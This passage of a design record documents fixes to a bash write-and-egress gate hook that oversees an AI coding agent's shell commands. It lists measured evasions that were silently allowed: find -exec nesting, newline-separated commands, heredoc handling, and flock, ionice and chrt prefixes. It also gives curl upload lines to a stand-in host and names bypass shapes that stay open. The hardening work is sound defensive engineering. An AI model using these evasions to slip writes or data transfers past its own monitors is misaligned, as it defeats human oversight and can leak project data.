find . -name x -exec cp {} src/y.py ';'                             -> set()
find . -name x -exec cp -t src {} +                                 -> set()
find . -name x -execdir cp {} src/y.py \;                           -> set()
find . -name x -ok cp {} src/y.py \;                                -> set()
find . -name x -okdir cp {} src/y.py \;                             -> set()
find . -name x -exec tee src/y.py \;                                -> set()
find . -name x -exec sed -i s/a/b/ src/y.py \;                      -> set()
find . -name x -exec curl -d @src/a.txt https://example.invalid \;  -> set()

find . -name x -print                                    -> set()                (control)
find . -name x | xargs cp -t src                         -> local /proj/src      (control, cycle P)
find . -name x -exec cp {} src/y.py \; ; cp seed.txt src/z.py
                                                         -> local /proj/src/z.py (control)
```

The third control is the one that mattered: only the nested command was lost, and the
segmentation around the construct was already intact.

Re-measured after the fix, same harness, same `WRIT_CWD`: the first six rows yield the
nested command's own destination (`local /proj/src/y.py`, and `local /proj/src` for the
`-t src` batch row), the `tee` and `sed -i` rows yield `local /proj/src/y.py`, the `curl`
row yields the egress host `example.invalid`, `-print` is still silent, the `xargs` control
is unchanged, and the third control now yields BOTH `local /proj/src/y.py` and
`local /proj/src/z.py`.

### Decision: one splice, not a fifth arm

Each nested-command span is appended to `segments` as an ADDITIONAL entry, piped flag
FALSE, immediately after the segment loop finishes and before any pass runs:

```python
NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
NESTED_TERMINATOR_CHARS = frozenset({";", "+"})

for _seg, _piped in list(segments):
    for _span in nested_command_spans(_seg):
        segments.append((_span, False))
```

The write loop then resolves `cmd0 = cp` for that entry and the egress loop resolves
`verb = curl`, with NO change to any write arm, no change to any egress arm and no change
to `verb_at`. The original `find` segment stays in the list: its `cmd0` is `find`, it
matches no arm, and its redirect scan keeps working, so `find ... -exec ... \; > log.txt`
still gates `log.txt`.

The egress half comes free rather than needing a second cycle for exactly one structural
reason: the write pass, the inline-interpreter pass and the egress pass are three loops
over the SAME `segments` list. One splice feeds all three, and the interpreter pass picking
up `find . -exec python3 -c "..." \;` is a third consequence of the same line, pinned as a
capability rather than left as a side effect nobody noticed.

Two alternatives were rejected, and the reasons belong in the record:

- A FIFTH `cmd0` arm for `find` would have to re-implement the destination logic of all
  four existing arms (the `tee` argument loop, `dd of=`, the `cp`/`mv`/`install` last
  positional plus its three `-t` spellings, and `sed -i`'s last positional), and it would
  not touch egress at all, so the transfer half would need its own cycle.
- Refactoring the per-segment body into a shared function callable on a nested span would
  rewrite the code path every existing test in this family runs through, for no coverage
  the splice does not already buy.

The helper sits OUTSIDE the `MIRROR BEGIN/END split_control_operators` block on purpose.
That block is byte-compared across three copies, so putting the splice inside it would
force an identical change to `writ/session/bash_tokens.py` and would change
`writ-worktree-safety.sh` behavior on unmeasured evidence.

### Span boundaries, and why they are reliable

The spans are derived PER SEGMENT, from the already-built list, not from the raw token
stream, which makes a control operator a hard stop for free: a span cannot cross a segment
boundary because the boundary split happened first. A span runs from the token after the
flag to the terminator, or to the END of the segment when there is none.

Every terminator survives tokenization as a distinct token and none of them becomes a
`CONTROL` member. MEASURED token forms: `\;` gives `'\\;'`, `';'` gives `"';'"`, `";"`
gives `'";"'`, and `+` gives `'+'`. A BARE `;` never appears inside a segment at all,
because it IS a `CONTROL` token and has already ended the segment before the splice runs.
The list is SNAPSHOTTED before splicing, so a spliced span is never itself rescanned: one
level is every level find has, and re-entering would be an unbounded loop for no coverage.

### The flag family was undercounted

FOUR flags, which is two more than the header used to name. `-ok` and `-okdir` prompt the
user before each command and then RUN it, so both are write vectors exactly as `-exec` and
`-execdir` are. Both were measured silent, and both were named NOWHERE before this cycle:
not in the header's uncovered block, not in this ADR, not in any test. A disclosure that
misstates the SIZE of a hole is what stops the next reader re-examining it, which is the
same failure the cycle P amendment recorded about a false reason.

No count is pinned anywhere. The new test module derives its flag axis from the hook's own
`NESTED_CMD_FLAGS` and asserts the axis EQUALS that set, so a fifth spelling added later
reddens the axis-equality test instead of sitting outside a stale literal.

### The batch form's real constraint

EXECUTED against GNU findutils 4.9.0 on the implementing machine:

```
find . -maxdepth 0 -name __nomatch__ -exec cp {} dest +
    -> find: missing argument to `-exec'   (exit 1)
find . -maxdepth 0 -name __nomatch__ -ok cp -t dest {} +
    -> find: missing argument to `-ok'     (exit 1)
```

The first says `{}` must be the trailing argument under `+`, so under `+` a destination is
reachable only as a FLAG VALUE (`cp -t DIR {} +`) and NO detector for `cp {} dest +` is
built, because that command can never run. The second was INFERRED by the plan from find's
documentation and is now MEASURED: `+` is rejected for `-ok` as well, so the test module's
batch-terminator axis stays the two flags and does not widen to all four. The `;` family
has no ordering constraint, so a destination may sit anywhere in the nested argument list,
and its consumer set is therefore the wider one.

### Accepted costs

`{}` is find's placeholder, not a path. The two brace discards elsewhere in the hook
(`CODE_PUNCT` in `token_literals`, the brace skip in `scan_tokens`) are on the INTERPRETER
path only, not on the `cmd0` write arms. So a spelling that puts the placeholder in
DESTINATION position emits a row naming the placeholder: MEASURED,
`find . -name x -exec tee {} \;` and `find . -name x -exec sed -i s/a/b/ {} \;` each yield
`local /proj/{}`. Three treatments were weighed and the chosen one is to leave the
placeholder alone and PIN the row:

- Skipping brace-bearing targets globally at the normalization point also changes non-find
  behavior, turning a real `echo x > src/{a}.py` into silence. MEASURED as still collected
  (`local /proj/src/{a}.py`) both before and after this cycle, and pinned, so the
  alternative's cost is executable rather than argued.
- Dropping `{}` tokens out of the span is actively worse for the `sed` arm, whose "last
  positional is the file" heuristic then reads the SCRIPT as the file, and it leaves
  `tee {}` with no argument at all.

The row is fail-closed and strictly better than the silence it replaces: a real in-place
bulk edit now reaches the work gate instead of no gate at all, and the only thing wrong is
the TEXT of a path that no single file can be named for. When the placeholder is a SOURCE
rather than a destination the cost does not arise at all, because the arm takes the last
positional: `-exec cp {} src/y.py \;` yields the real destination.

The second cost is that the flags are matched as a MECHANISM on the RAW token and NOT
conditioned on the segment's verb being `find`, which follows this file's own posture at
`WRAPPER_POSITIONALS`: fail-closed for the verb, fail-open for detection, where an extra
row for a command that never runs is cheaper than a lost row for one that does. The
consequences, both MEASURED and both pinned:

- A QUOTED mention opens no span, because `shlex(posix=False)` leaves the quote characters
  on. `grep -- '-exec cp {} src/y.py' src/notes.txt`, `echo "-exec cp {} src/y.py"` and
  `git commit -m "use -exec cp {} src/y.py"` are all still silent after the fix. This is
  the discrimination the mechanism has to make, and it is the same rule
  `strip_group_opener` applies to a quoted group opener.
- An UNQUOTED mention in any command's arguments DOES open a span, whatever the verb, so
  `echo find . -exec cp {} src/y.py`, `somecmd -exec cp {} src/y.py \;` and
  `myscript --pattern -exec cp {} src/y.py \;` each emit `local /proj/src/y.py` for a
  command that writes nothing. That is the accepted cost, and it survives `\find`, an
  alias, and a wrapper-prefixed find, which conditioning on `verb_at(seg)[0] == "find"`
  would not.

### Deferred, each for a stated reason

- DELETION, by the recorded ruling in the hook's irreversible-destruction block ("rm -rf,
  DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"). MEASURED after the fix:
  `find . -name x -exec rm {} \;` and `find . -name x -delete` are both still silent,
  because `rm` matches no `cmd0` arm and `-delete` carries no nested command. Both pinned,
  so the closure is not read as smuggling deletion into scope. Neither command matches the
  hook's cheap early-exit globs either, so through the full hook they never even reach the
  extractor: the extractor-level pins are the tighter assertion of the two.
- The worktree gate's OWN exposure. `find . -exec git worktree remove x \;` evading
  `writ-worktree-safety.sh` is INFERRED from that hook's source, not measured, and is
  deferred for exactly the reason cycle P gave for not growing that hook's prefix set: its
  parsing is permissive-only by design and a change there would be a second unmeasured
  change.
- `fd --exec` / `fd -x`. The SAME nested-command mechanism under another tool's flag
  spellings, which `NESTED_CMD_FLAGS` does not carry. NOT MEASURED, so it is recorded as a
  stated suspicion and it takes find's place in the header's names-only block.
- `sh -c` inside a nested command, unchanged. MEASURED still silent:
  `find . -name x -exec sh -c 'cp seed.txt src/y.py' \;` yields nothing, because the body
  is ONE token and no `cmd0` arm matches it. That is the already-disclosed `sh -c` limit,
  not a new one.
- Resolving find's SEARCH ROOT into the placeholder. find's path operands precede its
  expression and may repeat, so this is a separate mechanism and is deliberately not
  attempted. The residue is stated below.

### The residue is executable, not only prose

The placeholder row always resolves under the cwd even when find's search root is
elsewhere, so an out-of-repo bulk in-place edit is reported as `local` rather than
`outside` and does not reach the project-boundary refusal that the DIRECT spelling of the
same write does reach. That asymmetry is a test with the direct spelling beside it as the
contrast, so a future cycle that resolves find's search roots has a red test to turn green
rather than a paragraph to rediscover. It is under-detection relative to a perfect gate and
strictly more detection than the total silence it replaces.

The machine-readable residue grew a second half. The header's names-only block between
`# UNCOVERED PREFIXES BEGIN` and `# UNCOVERED PREFIXES END` no longer names find's flags,
and the ratchet that reads it now derives TWO covered populations: the hook's own
`WRAPPERS` keys AND its own `NESTED_CMD_FLAGS`. Naming a covered prefix as uncovered,
closing a prefix without updating the block, and closing a nested-command FLAG without
updating the block all redden there.

### The order of the changes was itself a trap

Removing find's flags from the names-only block reddens EXACTLY ONE assertion and does NOT
redden the behavior test that asserted `set()`. So the block edit alone would produce a
file whose header reads "closed" while a green behavior test still pinned the hole open.
The block edit, the behavior fix and the rewritten behavior test therefore landed in the
SAME commit, and that was checked explicitly before the commit rather than left to chance.

### Measured versus inferred

MEASURED: the nine silences and the three controls above, before the fix and again after
it, through the extractor with `WRIT_CWD=/proj`; the four terminator token forms; both
findutils 4.9.0 rejections, executed with exit codes; the two placeholder rows
(`local /proj/{}` for `tee {}` and for `sed -i s/a/b/ {}`); the braced-path control
(`echo x > src/{a}.py` still collected); the three quoted mentions staying silent and the
three unquoted mentions emitting a row; the two deletion spellings staying silent; and the
real hook's `permissionDecision` for two nested commands, an egress ask naming the host and
a credential deny carrying `[SEC-CREDENTIAL-WRITE]`.

NOT MEASURED, stated plainly rather than implied: the real hook's `permissionDecision` for
a nested project WRITE, which is proved at the extractor layer only, the same boundary every
earlier cycle in this family recorded; and a write LANDING ON DISK through the full Claude
Code path, which a `PreToolUse` hook test cannot show at all. INFERRED, not measured:
`find . -exec git worktree remove x \;` evading the worktree gate, and `fd --exec` carrying
the same mechanism under a spelling this fix does not cover.

## Amendment (cycle R): a newline separator, and a defective reference implementation

Sixth instance of the same seam, and the first one where the fix ALREADY EXISTED in the
other hook and was itself wrong. `CONTROL` in `writ-bash-write-gate.sh` carried a `"\n"`
member that matched NOTHING, because `shlex.split` treats a newline as ordinary whitespace
and never emits it as a token, so a multi-line command was ONE segment whose verb was the
first line's.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
"ls\ncp seed.txt src/x.py"                       -> set()                    INVISIBLE
"ls ; cp seed.txt src/x.py"                      -> local /proj/src/x.py      control
"ls\necho y > src/x.py"                          -> local /proj/src/x.py      VISIBLE
"ls\ncurl -d @src/a.txt https://example.invalid" -> set()                    INVISIBLE
```

A newline hid every VERB-DEPENDENT write and every egress row, and hid no REDIRECT. That
asymmetry is the mechanism, not luck: the redirect loop never consults the verb, while the
four `cmd0` write arms and the egress pass all do, so flattening the command into one
segment blinded exactly the arms that ask "what is the verb here?".

### The reference implementation was defective, and both defects were EXECUTED

`writ-worktree-safety.sh` had carried a newline pre-split and a heredoc-body stripper since
1.7.0, so this cycle reads like a port. It is not. Both halves were copied out verbatim and
RUN. The pre-split is correct. The stripper is wrong twice over:

```
doc ABOUT a write, with a REAL same-line redirect
  cat <<'EOF' > docs/notes.txt / old command: echo y > src/x.py / EOF
    today (no pre-split)     src/x.py True   docs/notes.txt True    n=11
    pre-split only           src/x.py True   docs/notes.txt True    n=13
    pre-split + stripper     src/x.py False  docs/notes.txt False   n=1

interpreter fed by heredoc, REAL write in the body
  python3 - <<'EOF' / open('src/x.py',...) / EOF
    today (no pre-split)     src/x.py True                          currently DETECTED
    pre-split + stripper     src/x.py False                         coverage LOST
```

DEFECT 1, NO SAME-LINE BOUNDARY. The function consumed tokens from immediately after the
opener token and scanned forward for the terminator, so everything legitimately following
the opener ON ITS OWN LINE was swallowed with the body: 11 tokens in, 1 out, and
`docs/notes.txt`, the command's real destination, lost along with the phantom. Bash starts
a heredoc body at the next NEWLINE. That function had no notion of a newline at all.

DEFECT 2, IT DELETED COVERAGE THE WRITE GATE ALREADY HAD. A stdin-fed interpreter sets
`stdin_interpreter` and then scans the ENTIRE token list, which is how a `python3 - <<'EOF'`
body is seen; the write gate's header claims that coverage in the inline-interpreter block.
Stripping the body removes the only place that source text appears, so a verbatim port would
have been a NET LOSS on a vector that worked.

WHY THE WORKTREE HOOK COULD NOT SEE EITHER ONE, which is the part the next reader needs:
that hook has no redirect vector at all and asks only whether a `git worktree add` is
present, and its single heredoc test asserted only the verdict and said nothing about a
target. So the same-line defect had zero coverage there and the destination half of it was
structurally unobservable.

### Decision: three parts, one shared copy

1. THE PRE-SPLIT IS REUSED UNCHANGED. It is a pure quote-aware text transform: a newline
   inside a quoted string stays data, and the escape branch keeps a backslash-continued
   line one command. Rewriting a correct function to look new would have been churn.
2. THE STRIPPER IS REPAIRED AT THE NEWLINE BOUNDARY. The body is the run from the FIRST
   `SEP` after the opener through the terminator word, so `cat <<'EOF' > docs/notes.txt`
   keeps its destination. The OPENER TOKEN is emitted too, and that is load-bearing rather
   than tidy: `inline_form` reads any argument starting with `<` as the stdin form, so the
   opener is the ONLY marker of the no-dash `python3 <<'DELIM'` spelling, and the 1.7.0 copy
   dropped it. An opener with no following `SEP` strips nothing, because there is no body in
   that token stream and consuming to the end would silence the rest of the command.
3. THE STDIN SCAN KEEPS THE UNSTRIPPED STREAM. Segmentation and every per-segment pass read
   the STRIPPED list; the `stdin_interpreter` whole-command scan reads the UNSTRIPPED one.
   The reason is that pass's own design rather than convenience: it is deliberately a coarse
   bag-of-literals question over the whole command, so the pre-strip stream is what matches
   its stated contract. The extra pass is built INSIDE the `if stdin_interpreter:` branch, so
   a command that is not a stdin-fed interpreter never pays it.

Both helpers went INSIDE the mirrored block, so ONE repaired copy serves both hooks and the
existing byte-identity and per-copy stream-equivalence tests guard drift. The alternative
was to add them to the write gate alone and leave the worktree hook's copies untouched; it
was rejected because the two copies would then differ in BEHAVIOR while claiming a shared
mechanism, and because the same-line defect is a live hole in the worktree hook.

Cycle Q put `nested_command_spans` OUTSIDE the block for the stated reason that sharing it
would change the worktree hook's behavior on UNMEASURED evidence. That is not a
contradiction with this cycle: here the worktree hook is the file the evidence is ABOUT. It
already ran both helpers and one of them was executed wrong.

### The zero-import contract retired a regex

`writ/session/bash_tokens.py` imports NOTHING on purpose, so it loads under `python -S` and
is safe to paste inline, and the mirror test EXECS the block in an empty namespace. The
stripper's opener test was a `re.compile` pattern, which could not go in the block. It is
now string operations, and the character classes are SPELLED OUT (`_HD_FIRST`, `_HD_REST`)
rather than using `str.isalnum()`, because `isalnum()` is Unicode-aware and would have
silently widened the population the retired `[A-Za-z_][A-Za-z0-9_]*` classes defined while
reading as a faithful translation. One behavior deliberately changed in the rewrite: an
EMPTY delimiter (`<<''`) is no longer accepted as an opener. The regex accepted it, then
scanned for a token equal to the empty string, found none, and swallowed the rest of the
command.

### The worktree hook's own hole

The one place the same-line repair changes a VERDICT in that hook:

```
cat <<'EOF' > notes.md ; git worktree add scratch/feature-x feature-x
some notes
EOF
```

With the 1.7.0 stripper the run from the opener through `EOF` was swallowed, so
`git worktree add` never reached a segment and the command was ALLOWED SILENTLY. With the
same-line boundary the invocation survives and the hook denies with
`ENF-PROC-WORKTREE-001`. A test pins it, which turns "a known-defective copy is being
repaired" from prose into an executable claim.

### Residue that stays open

Three shapes degrade, each fail-closed (an extra row or a lost DESTINATION, never a lost
verdict on a command that runs), all three MEASURED through the extractor with
`WRIT_CWD=/proj`:

- A body line naming the terminator word MID-LINE ends the strip early, because this is a
  token scan and bash's rule is a LINE rule. `cat <<'EOF' > docs/notes.txt` over
  `this EOF is not a terminator > src/x.py` emits BOTH `local /proj/docs/notes.txt` and
  `local /proj/src/x.py`: the remaining body tokens become arguments of the opener line's
  command, so the phantom returns.
- TWO heredoc openers on one command (`cat <<'A' <<'B'`) honor only the FIRST terminator, so
  the second body is judged as commands: measured as `local /proj/docs/notes.txt` plus
  `local /proj/src/x.py`. Collecting successive bodies is more code for a shape neither hook
  has ever seen.
- An opener GLUED to what follows it (`cat <<'EOF'>docs/notes.txt`) is not recognized as an
  opener at all, because stripping runs on the RAW shlex tokens ahead of
  `split_control_operators`. That ordering is deliberate: a body line must never be
  re-split, or it can contribute a segment. MEASURED: the command emits
  `local /proj/src/x.py` ALONE. The body line becomes its own segment and is judged (an
  extra row, fail-closed), and the opener's own destination is NOT recovered, because
  `REDIR` cannot match a token that starts with `<` and the splitter deliberately does not
  split `>`. That is the SAME `foo>src/x.py` residue this ADR has disclosed since it was
  written, reached through a heredoc opener rather than through a verb, and closing it needs
  the tokenizer change this ADR RULED OUT.

### Measured versus inferred

MEASURED or EXECUTED: the four extractor rows before the fix and after it; both heredoc
token-stream comparisons on a verbatim copy of the 1.7.0 helpers, including the token counts
11, 13 and 1 and the two boolean columns; the post-repair count for the doc case, 4 tokens
(`cat`, the opener, `>`, `docs/notes.txt`), which is what the same-line boundary buys over
the reference implementation's 1; the three residue rows above; and the worktree hook's deny
on a `git worktree add` sharing the heredoc opener's line.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded.

## Amendment (cycle S): three more wrapper prefixes, and a positional that must NOT be shape-checked

Same seam, sixth instance, same single function, and this time no new mechanism at all.
`verb_at` still steps over a command prefix only by membership in `WRAPPERS`, so `flock`,
`ionice` and `chrt` became `cmd0` themselves and the real command was never resolved.
`verb_at` is the single source for the write pass, the egress pass and the interpreter
pass, so each of the three hid a write AND a data transfer.

### Measured before the fix

At the OUTER hook layer first, because that is where the defect was observed: a crafted
`PreToolUse` envelope for the real hook, run from a cwd outside the project so the write
target lands out of bounds, with `nice` (already a `WRAPPERS` member) as the
registered-wrapper positive control.

```
cp README.md ~/outside_probe.txt                     -> DENY  [ENF-PROJECT-BOUNDARY]
nice cp README.md ~/outside_probe.txt                -> DENY  [ENF-PROJECT-BOUNDARY]
flock /tmp/l.lock cp README.md ~/outside_probe.txt   -> ALLOW (silent, no decision)
ionice -c3 cp README.md ~/outside_probe.txt          -> ALLOW (silent, no decision)
chrt -b 0 cp README.md ~/outside_probe.txt           -> ALLOW (silent, no decision)
```

Then through the gate's own embedded extractor with `WRIT_CWD=/proj`. Cycle P's plan
claimed an egress before-state it had only measured on the write half; this cycle measured
BOTH halves before the entries landed, which is the whole point of the row block below:

```
cp seed.txt src/y.py                                          -> local /proj/src/y.py  (control)
nice -n 5 cp seed.txt src/y.py                                -> local /proj/src/y.py  (control)
flock /tmp/l.lock cp seed.txt src/y.py                        -> set()
ionice -c3 cp seed.txt src/y.py                               -> set()
chrt -b 0 cp seed.txt src/y.py                                -> set()

curl -d @src/a.txt https://example.invalid                    -> egress example.invalid  (control)
nice -n 5 curl -d @src/a.txt https://example.invalid          -> egress example.invalid  (control)
flock /tmp/l.lock curl -d @src/a.txt https://example.invalid  -> set()
ionice -c3 curl -d @src/a.txt https://example.invalid         -> set()
chrt -b 0 curl -d @src/a.txt https://example.invalid          -> set()
```

The bash-side hot-path early exit was CHECKED rather than assumed: its first arm matches
`*"cp "*`, so all three probes reached the python extractor exactly as the `nice` control
did. The single mechanism is `verb_at`.

### Decision: three more STRICT tables, read off `--help` and not off the completion files

Cycle P's posture is reused unchanged. Each entry carries both a value-flag set and a
no-value-flag set; `PERMISSIVE` (a `None` second element) is rejected for the same reason
as before, since it reads a SPACED value of an unknown flag as the verb, and it matters
more here because two of the three also step a positional.

The tables were drafted from `/usr/share/bash-completion/completions/*` and then CORRECTED
against the installed binaries' own `--help` (util-linux 2.39.3 for all three). That found
one real divergence and one gap, which is why the operational step is not optional:

- The completion file reads ionice's `-p`, `-P` and `-u` as bare switches. `ionice --help`
  spells them `-p, --pid <pid>...`, `-P, --pgid <pgrp>...` and `-u, --uid <uid>...`, each
  taking a following value, so all three are VALUE flags here rather than NOVALUE. Nothing
  pinned flips either way, because those forms run no command at all, but the table is now
  what the binary says rather than what a completion script implied.
- chrt's `-a/--all-tasks`, `-m/--max` and `-v/--verbose` ARE named by 2.39.3's `--help`,
  so they are listed. An unclassified flag bails and re-blinds that spelling, so a missing
  name is a hole, not a tidy omission. chrt's `-p/--pid` really is value-less there (the
  pid follows as a positional, `chrt [options] -p <pid>`), which is the opposite of
  ionice's `-p`.
- flock 2.39.3 prints no `--nb` or `--wait` aliases, so neither is listed.

A LETTER MEANS DIFFERENT THINGS IN DIFFERENT TABLES, and the three must never be
copy-pasted between one another: flock's `-n` is `--nonblock` (no value) while ionice's
`-n` is `--classdata` (value), and chrt's `-P` is `--sched-period` while ionice's `-P` is
`--pgid`.

### The positional shape becomes per wrapper, which is the only mechanism change

`WRAPPER_POSITIONALS` existed, but the loop that consumed it hardcoded timeout's shape:

```python
for _ in range(WRAPPER_POSITIONALS.get(name, 0)):
    if i < len(seg) and DURATION.match(dequote(seg[i])):
```

`DURATION` is `^[0-9]+(\.[0-9]+)?[smhd]?$`, which no lock path matches. A bare
`"flock": 1` entry would therefore have left the prefix BLIND: the path would not be
skipped, `basename("/tmp/l.lock")` would resolve as the verb, and the entry would have
read as a fix while changing nothing. The fix is a second side table keyed the same way:

```python
WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}
DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")     # timeout: coreutils duration
PRIORITY = re.compile(r"^[0-9]+$")                         # chrt: non-negative integer
LOCK_TARGET = re.compile(r"[\s\S]")                        # flock: any non-empty token
WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, "chrt": PRIORITY}
```

with the loop's condition becoming `WRAPPER_POSITIONAL_SHAPES[name].match(...)`. The
`WRAPPER_POSITIONALS.get(name, 0)` expression is preserved byte for byte, because an
existing mutation test targets that exact string.

`LOCK_TARGET` IS `[\s\S]` AND NOT `.`, and the difference is a live bypass rather than a
matter of taste. This cycle's first implementation used `.`, which in python does not match
a newline without `re.DOTALL`. A lock target that dequotes to a bare newline was therefore
NOT stepped, the newline resolved as the verb, and the segment went silent on the write,
credential and egress passes at once. Real flock accepts it: a lock file named with a
newline is created and the wrapped command runs. Measured against the hook, `flock $'\n' cp
x <outside>` was ALLOWED while both an ordinary lock path and the bare command were DENIED.
An empty token still does not match, which is the correct direction: flock exits 66 on an
empty lock name, so nothing runs. Review caught this before it shipped; the pin is
`TestFlockPositional::test_a_newline_only_lock_target_is_stepped_like_any_other`.

WHAT QUALIFIES a wrapper for the positional table is that its positional is MANDATORY, not
that it has a checkable shape. That distinction is new this cycle and it is what carries
`flock`: cycle P's justification (a duration has a checkable shape) covers `timeout` and
`chrt` only. `coproc` and `function` stay excluded for the opposite reason, since their
NAME is OPTIONAL and stepping it is a guess.

The two fail directions are deliberately OPPOSITE, and each is right for its tool:

- `flock` is stepped UNCONDITIONALLY. A shape check there would BE the defect rather than
  the guard, because a lock file can be named anything. One skip is correct in both
  spellings: with a command present, flock reads the first positional as a FILE even when
  it looks numeric, so `flock -x 200 cp seed.txt src/y.py` really does run `cp`. The fd
  form `flock -x 200` and the bare `flock` both land past the end under the `i < len(seg)`
  guard and yield no verb, which is right because neither runs a command.
- `chrt` stays SHAPE-CHECKED against `PRIORITY`. A priority-less `chrt -b cp seed.txt
  src/y.py` is a command chrt itself rejects ("invalid priority argument"), and the check
  is what keeps `cp` visible instead of swallowing it as a bogus priority. Cost at worst
  is an extra row for a command that never runs, never a lost row for one that does.
- `ionice` gets NO positional entry, so the token after its options IS the verb.

The lookup is a bare SUBSCRIPT rather than `.get` with a default. A positional entry with
no shape entry is a table drift, and a loud failure beats a silently-chosen default; a
key-set parity test over both tables, parsed from the extractor source by `ast`, makes that
drift red at test time instead.

Alternatives rejected:

- Widen the `WRAPPERS` tuple to three elements. It touches thirteen entries that have no
  positional, to carry a field that is `None` in all of them.
- One regex for all three. Any single shape re-blinds whichever wrapper it does not fit,
  which is exactly the defect being fixed.
- Skip unconditionally for all three. It costs chrt's priority-less form, where the token
  that would be swallowed is the real command.

### Accepted misses, each pinned as a silence rather than left to be rediscovered

- `flock /tmp/l.lock -c 'cp seed.txt src/y.py'`. The lock target is stepped, `-c` then sits
  in verb position, `basename("-c")` is not a `WRAPPERS` key, and the body is ONE quoted
  token. The same deliberately-uncovered class as `bash -c` and `watch -n1 '...'`, ruled
  out by the false-positive cost of gating every such command, not by a parsing obstacle.
- `flock cp seed.txt src/y.py` resolves `seed.txt`, which matches no arm. That is not a
  miss: with no command after it, flock really would treat `cp` as the lock file, so the
  skip agrees with the tool's own grammar rather than guessing against it.
- The id forms that run no command: `ionice -p 1234`, `chrt -p 1234` and `chrt -p 5 1234`
  are all silent, and none can name a wrong verb, because trailing digits never coincide
  with a write arm.
- DELETION stays out of scope for this gate by recorded ruling, so
  `flock /tmp/l.lock rm -rf src` STAYS silent after the fix.
- The worktree gate's own seven-name `WRAPPERS` is NOT grown, for the reason cycle P
  recorded: its parsing is permissive-only by design, it has no positional mechanism, and
  the evasion there is INFERRED from the code rather than measured. Only its comment moves,
  so the stated divergence (thirteen, now sixteen, against seven) does not go stale.

### The residue block, and one honest downgrade

The header's names-only `# UNCOVERED PREFIXES BEGIN/END` block loses `flock`, `ionice` and
`chrt`, which the existing disjointness ratchet in `tests/test_bash_egress_gate.py` enforces
on its own: leaving a name there while it is a `WRAPPERS` key goes red. `parallel`,
`unbuffer` and `fd` move from "no table here yet" to NOT INSTALLED on this machine, so
their gaps are UNMEASURABLE here rather than merely unmeasured, and none is added on
inference. `script`, `su -c` and `strace` are installed and stay out of scope this cycle.

### Measured versus inferred

MEASURED: the six outer-hook decisions before the fix and the same six after it (the three
new prefixes flip from a silent allow to the same `[ENF-PROJECT-BOUNDARY]` deny the two
controls already returned, and `flock -c` stays silent); the ten extractor rows above
before the fix and after it, both halves; each of the three flag tables against the
installed binary's own `--help` (util-linux 2.39.3), including the ionice correction that
contradicted the drafted table; and the full hook's `permissionDecision` for the prefixed
credential write (deny, `SEC-CREDENTIAL-WRITE`) and the prefixed egress command (`ask`,
naming the host) for all three prefixes, which needs no daemon.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path,
which a `PreToolUse` hook test cannot show at all, the same boundary every earlier cycle in
this family recorded; and the real hook's `permissionDecision` for a prefixed IN-PROJECT
write, which needs the session daemon and is proved at the extractor layer only. INFERRED,
not measured, and unchanged from cycle P: `timeout 5 git worktree remove x` evading the
worktree gate by the same mechanism.
